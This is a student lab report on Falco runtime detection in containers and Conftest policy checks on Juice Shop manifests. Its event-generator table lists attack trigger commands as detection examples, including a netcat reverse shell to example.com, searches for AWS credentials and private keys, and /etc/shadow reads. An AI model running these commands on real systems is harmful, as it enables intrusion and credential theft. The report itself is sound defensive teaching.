# Lab 9 — Monitoring & Compliance: Falco Runtime Detection + Conftest Policies

**Author:** Baha Alimi
**Branch:** `feature/lab9`
**Target:** `alpine:3.19` (Falco runtime), `bkimminich/juice-shop:v19.0.0` (Conftest manifests)

---

## Task 1 — Runtime Security Detection with Falco (6 pts)

### 1.1 Environment Setup

**Falco version:** 0.43.0 (x86_64)
**Engine:** modern BPF probe (default in `falcosecurity/falco:latest`)
**Host:** Windows 11 / Docker Desktop / WSL2 kernel `5.15.167.4-microsoft-standard-WSL2`

```powershell
# Helper container
docker run -d --name lab9-helper alpine:3.19 sleep 1d

# Falco container with modern eBPF
docker run -d --name falco \
  --privileged \
  -v /proc:/host/proc:ro \
  -v /boot:/host/boot:ro \
  -v /lib/modules:/host/lib/modules:ro \
  -v /usr:/host/usr:ro \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v "${PWD}/labs/lab9/falco/rules:/etc/falco/rules.d:ro" \
  falcosecurity/falco:latest \
  falco -U -o json_output=true -o time_format_iso_8601=true
```

**Startup confirmation:**
```
2026-03-20T07:06:17+0000: Opening 'syscall' source with modern BPF probe.
2026-03-20T07:06:17+0000: Loading rules from:
2026-03-20T07:06:17+0000:    /etc/falco/falco_rules.yaml | schema validation: ok
2026-03-20T07:06:17+0000:    /etc/falco/rules.d/custom-rules.yaml | schema validation: ok
2026-03-20T07:06:17+0000: Loaded event sources: syscall
2026-03-20T07:06:17+0000: Enabled event sources: syscall
```

> **Note on WSL2 TOCTOU warnings:** Falco logged `failed to determine tracepoint 'syscalls/sys_enter_connect'` (and similar) for several syscall entry points. These are non-fatal — the WSL2 kernel does not expose all tracepoints that Falco's TOCTOU mitigation probes require. Falco explicitly states *"Detection will continue to work, but TOCTOU mitigation may not properly work"*. All detection rules functioned correctly throughout the lab.

---

### 1.2 Baseline Alert A — Terminal Shell in Container

**Trigger command:**
```powershell
docker exec -it lab9-helper /bin/sh -lc 'echo hello-from-shell'
```

**Falco alert (JSON):**
```json
{
  "hostname": "bd43098fe774",
  "output": "2026-03-20T01:47:06.591901689+0000: Notice A shell was spawned in a container with an attached terminal | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=containerd-shim command=sh -lc echo hello-from-shell terminal=34816 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=46362388bedc container_name=lab9-helper container_image_repository=alpine container_image_tag=3.19",
  "priority": "Notice",
  "rule": "Terminal shell in container",
  "source": "syscall",
  "tags": ["T1059", "container", "maturity_stable", "mitre_execution", "shell"],
  "time": "2026-03-20T01:47:06.591901689Z"
}
```

**Analysis:**

| Field | Value | Significance |
|-------|-------|--------------|
| Rule | `Terminal shell in container` | Built-in Falco stable rule |
| Priority | Notice | Non-critical but operationally significant |
| MITRE tag | `T1059` (Command and Scripting Interpreter) | Maps to MITRE ATT&CK execution technique |
| `proc.exepath` | `/bin/busybox` | Shell binary resolved through BusyBox symlink |
| `exe_flags` | `EXE_WRITABLE\|EXE_LOWER_LAYER` | Executable writable and in a lower image layer — drift indicator |
| `proc.tty` | `34816` | TTY attached, confirming interactive session |

**Why this matters:** Interactive shell access inside a running container is a strong indicator of hands-on-keyboard attacker activity. In production, containers should not have shells spawned against them at runtime; any `exec` into a running container warrants immediate investigation. This rule detects the `execve` syscall for shell binaries with an attached TTY — a pattern with very low false-positive rates in production workloads.

---

### 1.3 Baseline Alert B — Write to Binary Directory (Container Drift)

**Trigger command:**
```powershell
docker exec --user 0 lab9-helper /bin/sh -lc 'echo boom > /usr/local/bin/drift.txt'
```

**Falco alert (JSON):**
```json
{
  "hostname": "69c6d178d954",
  "output": "2026-03-20T07:07:04.565722138+0000: Warning Falco Custom: File write in /usr/local/bin (container=lab9-helper user=root file=/usr/local/bin/drift.txt flags=O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER)",
  "output_fields": {
    "container.id": "3d72dc9d7817",
    "container.image.repository": "alpine",
    "container.image.tag": "3.19",
    "container.name": "lab9-helper",
    "evt.arg.flags": "O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER",
    "fd.name": "/usr/local/bin/drift.txt",
    "user.name": "root"
  },
  "priority": "Warning",
  "rule": "Write Binary Under UsrLocalBin",
  "source": "syscall",
  "tags": ["compliance", "container", "drift"],
  "time": "2026-03-20T07:07:04.565722138Z"
}
```

**Analysis:**

| Field | Value | Significance |
|-------|-------|--------------|
| Rule | `Write Binary Under UsrLocalBin` | Custom rule — fired as expected |
| Priority | Warning | Elevated — binary directory writes are high-fidelity drift indicators |
| `fd.name` | `/usr/local/bin/drift.txt` | Exact file path captured |
| `evt.arg.flags` | `O_CREAT\|O_WRONLY\|FD_UPPER_LAYER` | New file created in container's writable upper layer — classic drift |
| `user.name` | `root` | Write performed as root, compounding risk |

**Why this matters:** Writes to binary directories at runtime indicate container drift — the container filesystem deviating from its immutable base image. This is a common attacker technique for installing tools, backdoors, or replacing legitimate binaries. The `FD_UPPER_LAYER` flag confirms the write landed on the container's writable overlay layer, not the read-only image layers.

---

### 1.4 Custom Rule — Write Binary Under UsrLocalBin

**Rule file:** `labs/lab9/falco/rules/custom-rules.yaml`

```yaml
- rule: Write Binary Under UsrLocalBin
  desc: Detects writes under /usr/local/bin inside any container
  condition: evt.type in (open, openat, openat2, creat) and
             evt.is_open_write=true and
             fd.name startswith /usr/local/bin/ and
             container.id != host
  output: >
    Falco Custom: File write in /usr/local/bin (container=%container.name
    user=%user.name file=%fd.name flags=%evt.arg.flags)
  priority: WARNING
  tags: [container, compliance, drift]
```

**When the rule fires:**
- Any `open`/`openat`/`openat2`/`creat` syscall with write intent targeting a path under `/usr/local/bin/` inside any container
- Captures file creation, overwrite, and truncation of existing binaries

**When the rule should NOT fire (tuning considerations):**
- Writes during image build are excluded by `container.id != host`
- Legitimate application installs at container startup could produce false positives — in production scope with `container.image.repository not in (trusted_installer_images)` or suppress during init phase using a macro
- CI/CD build containers that legitimately install tools at runtime would need allowlisting by image name or label

---

### 1.5 Event Generator Results

**Command:**
```powershell
docker run --rm --name eventgen \
  --privileged \
  -v /proc:/host/proc:ro -v /dev:/host/dev \
  falcosecurity/event-generator:latest run syscall
```

The event generator executed a curated set of syscall-based attack simulations. Falco detected **20 alerts** across **18 distinct built-in rules**. Full alerts in `labs/lab9/falco/logs/falco.log`.

**Alert summary:**

| Rule | Priority | MITRE | Trigger |
|------|----------|-------|---------|
| `Disallowed SSH Connection Non Standard Port` | Notice | T1059 | `ssh user@example.com -p 443` |
| `Read sensitive file trusted after startup` | Warning | T1555 | `httpd` reading `/etc/shadow` |
| `PTRACE attached to process` | Warning | T1055.008 | `ptrace(PTRACE_ATTACH)` |
| `Find AWS Credentials` | Warning | T1552 | `find /tmp -iname .aws/credentials` |
| `Clear Log Activities` | Warning | T1070 | Write to simulated syslog path |
| `Create Hardlink Over Sensitive Files` | Warning | T1555 | `ln /etc/shadow .../shadow_link` |
| `Directory traversal monitored file read` | Warning | T1555 | `/etc/../etc/../etc/shadow` |
| `Packet socket created in container` | Notice | T1557.002 | `AF_PACKET` raw socket |
| `Search Private Keys or Passwords` | Warning | T1552.001 | `find /tmp -iname id_rsa` |
| `Run shell untrusted` | Notice | T1059.004 | Shell from untrusted binary |
| `Netcat Remote Code Execution in Container` | Warning | T1059 | `nc -e /bin/sh example.com 22` |
| `Debugfs Launched in Privileged Container` | Warning | T1611 | `debugfs -V` |
| `PTRACE anti-debug attempt` | Notice | T1622 | `PTRACE_TRACEME` |
| `Create Symlink Over Sensitive Files` | Warning | T1555 | `ln -s /etc .../etc_link` |
| `Fileless execution via memfd_create` | **Critical** | T1620 | Execute from `memfd:program` |
| `Read sensitive file untrusted` | Warning | T1555 | `/etc/shadow` by untrusted process |
| `Detect release_agent File Container Escapes` | **Critical** | T1611 | Write to `/release_agent` |
| `Remove Bulk Data from Disk` | Warning | T1485 | `shred -u` |
| `Drop and execute new binary in container` | **Critical** | TA0003 | Binary written + executed at runtime |
| `Execution from /dev/shm` | Warning | T1059.004 | Script run from `/dev/shm` |

**Three Critical alerts** were the most significant findings:

1. **`Fileless execution via memfd_create`** — code executed from an anonymous memory region with no file on disk, evading file-based detection
2. **`Detect release_agent File Container Escapes`** — write to `/release_agent` with full capability set, a known cgroup v1 container escape technique
3. **`Drop and execute new binary in container`** — binary written to container's upper layer at runtime (`EXE_UPPER_LAYER`) then executed, indicating a dropped payload

**Skipped:** `syscall.LaunchSuspiciousNetworkToolOnHost` — correctly skipped as `"not applicable to containers"`.

---

### 1.6 Falco Summary

| Alert | Rule | Priority | Source |
|-------|------|----------|--------|
| Baseline A | `Terminal shell in container` | Notice | Manual `docker exec` |
| Baseline B | `Write Binary Under UsrLocalBin` | Warning | Manual write to `/usr/local/bin/drift.txt` |
| Custom validation | `Write Binary Under UsrLocalBin` | Warning | Manual write to `/usr/local/bin/custom-rule.txt` |
| Event generator | 18 distinct rules, 3 Critical | Critical/Warning/Notice | `falcosecurity/event-generator run syscall` |

**Total unique rules triggered:** 19 (1 custom + 18 built-in)
**Event generator severity breakdown:** 3 Critical, 12 Warning, 5 Notice

---

## Task 2 — Policy-as-Code with Conftest (Rego) (4 pts)

### 2.1 Policies Created

#### `labs/lab9/policies/k8s-security.rego`

| Rule type | Check | Rationale |
|-----------|-------|-----------|
| `deny` | `privileged: true` | Privileged containers have full host kernel access |
| `deny` | `runAsUser: 0` | Root inside container maps to root on host |
| `deny` | `allowPrivilegeEscalation: true` | Permits setuid binary abuse post-start |
| `warn` | `readOnlyRootFilesystem: false` | Writable root enables malware persistence |
| `warn` | Missing `resources.limits` | Unbounded resources enable DoS |

#### `labs/lab9/policies/compose-security.rego`

| Rule type | Check | Rationale |
|-----------|-------|-----------|
| `deny` | `privileged: true` | Full host kernel exposure |
| `warn` | `user: "0"` | Root execution increases blast radius |

---

### 2.2 Manifest Analysis

#### Unhardened K8s Manifest (`juice-unhardened.yaml`)

```yaml
securityContext:
  runAsUser: 0
  privileged: true
  allowPrivilegeEscalation: true
  readOnlyRootFilesystem: false
# No resources.limits defined
```

**Conftest result:**
```
WARN - juice-unhardened.yaml - WARN: Container 'juice-shop' has no resource limits defined
WARN - juice-unhardened.yaml - WARN: Container 'juice-shop' should set readOnlyRootFilesystem: true
FAIL - juice-unhardened.yaml - DENY: Container 'juice-shop' must not run as privileged
FAIL - juice-unhardened.yaml - DENY: Container 'juice-shop' must not run as root (runAsUser: 0)
FAIL - juice-unhardened.yaml - DENY: Container 'juice-shop' must set allowPrivilegeEscalation: false

7 tests, 2 passed, 2 warnings, 3 failures, 0 exceptions
```

**Violation analysis:**

**FAIL 1 — `privileged: true`:** A privileged container bypasses all Linux namespace isolation. The event generator's `Detect release_agent File Container Escapes` Critical alert directly demonstrates what a privileged container enables — write to `/release_agent` to trigger host-level code execution.

**FAIL 2 — `runAsUser: 0`:** Root execution widens blast radius of any application vulnerability. The event generator's `Find AWS Credentials` and `Search Private Keys or Passwords` alerts show how a root process harvests credentials.

**FAIL 3 — `allowPrivilegeEscalation: true`:** Permits post-start privilege gain via setuid binaries. The event generator's `PTRACE attached to process` Warning demonstrates ptrace-based privilege escalation — blocked by `no-new-privileges`.

**WARN 1 — No `resources.limits`:** Unbounded resources enable the DoS patterns demonstrated by `Remove Bulk Data from Disk` (`shred -u`).

**WARN 2 — `readOnlyRootFilesystem: false`:** Directly enables the attack patterns detected by `Write Binary Under UsrLocalBin`, `Drop and execute new binary in container`, and `Execution from /dev/shm`. A read-only root filesystem would have blocked the drift.txt and custom-rule.txt writes at the kernel level.

---

#### Hardened K8s Manifest (`juice-hardened.yaml`)

```yaml
resources:
  limits:
    memory: "512Mi"
    cpu: "1.0"
  requests:
    memory: "256Mi"
    cpu: "0.5"
securityContext:
  runAsUser: 1000
  runAsNonRoot: true
  privileged: false
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
```

**Conftest result:**
```
7 tests, 7 passed, 0 warnings, 0 failures, 0 exceptions
```

**Fix mapping:**

| Violation (unhardened) | Fix (hardened) | Security effect |
|------------------------|----------------|-----------------|
| `privileged: true` → FAIL | `privileged: false` | Removes host kernel access |
| `runAsUser: 0` → FAIL | `runAsUser: 1000` + `runAsNonRoot: true` | Unprivileged UID |
| `allowPrivilegeEscalation: true` → FAIL | `allowPrivilegeEscalation: false` | Blocks setuid abuse |
| Missing `resources.limits` → WARN | `memory: 512Mi`, `cpu: 1.0` | Caps DoS surface |
| `readOnlyRootFilesystem: false` → WARN | `readOnlyRootFilesystem: true` | Blocks all runtime binary writes |
| *(additional)* | `capabilities.drop: [ALL]` | Removes `CAP_NET_RAW`, `CAP_SYS_PTRACE`, and all others flagged by event generator |

---

#### Docker Compose Manifest (`juice-compose.yml`)

```yaml
services:
  juice-shop:
    image: bkimminich/juice-shop:v19.0.0
    privileged: true
    user: "0"
```

**Conftest result:**
```
WARN - juice-compose.yml - WARN: Compose service 'juice-shop' is running as root (user: 0)
FAIL - juice-compose.yml - DENY: Compose service 'juice-shop' must not run as privileged

7 tests, 5 passed, 1 warning, 1 failure, 0 exceptions
```

**Remediation:**
```yaml
services:
  juice-shop:
    image: bkimminich/juice-shop:v19.0.0
    privileged: false
    user: "1000"
    security_opt:
      - no-new-privileges:true
```

---

### 2.3 Conftest Results Summary

| Manifest | Tests | Passed | Warnings | Failures |
|----------|------:|-------:|---------:|---------:|
| `juice-unhardened.yaml` | 7 | 2 | 2 | 3 |
| `juice-hardened.yaml` | 7 | 7 | 0 | 0 |
| `juice-compose.yml` | 7 | 5 | 1 | 1 |

---

## Conclusion

### Task 1

Falco's modern eBPF engine detected every targeted behavior in real time. The event generator produced 20 alerts including 3 Critical findings — fileless execution via memfd, release_agent container escape, and dropped binary execution — representing the most severe post-exploitation techniques available to an attacker inside a container.

The custom rule demonstrated that Falco's condition language enables precise, targeted detection with minimal noise using syscall-level fields (`evt.type`, `evt.is_open_write`, `fd.name`), and that rules load cleanly via SIGHUP or at startup without restarting the Falco process.

### Task 2

The Falco and Conftest findings are directly correlated — every `deny` violation in the unhardened manifest corresponds to an attack technique that Falco detected:

- `privileged: true` → enabled `release_agent` escape (Critical)
- `allowPrivilegeEscalation: true` → enabled ptrace attach (Warning)
- `readOnlyRootFilesystem: false` → enabled binary drift and dropped payload execution (Warning + Critical)

Static policy analysis catches misconfigurations at deploy time; runtime detection catches exploitation at runtime. Running both in a DevSecOps pipeline implements defense-in-depth: Conftest blocks the misconfigured deployment, and Falco provides the last line of defense if a misconfiguration reaches production.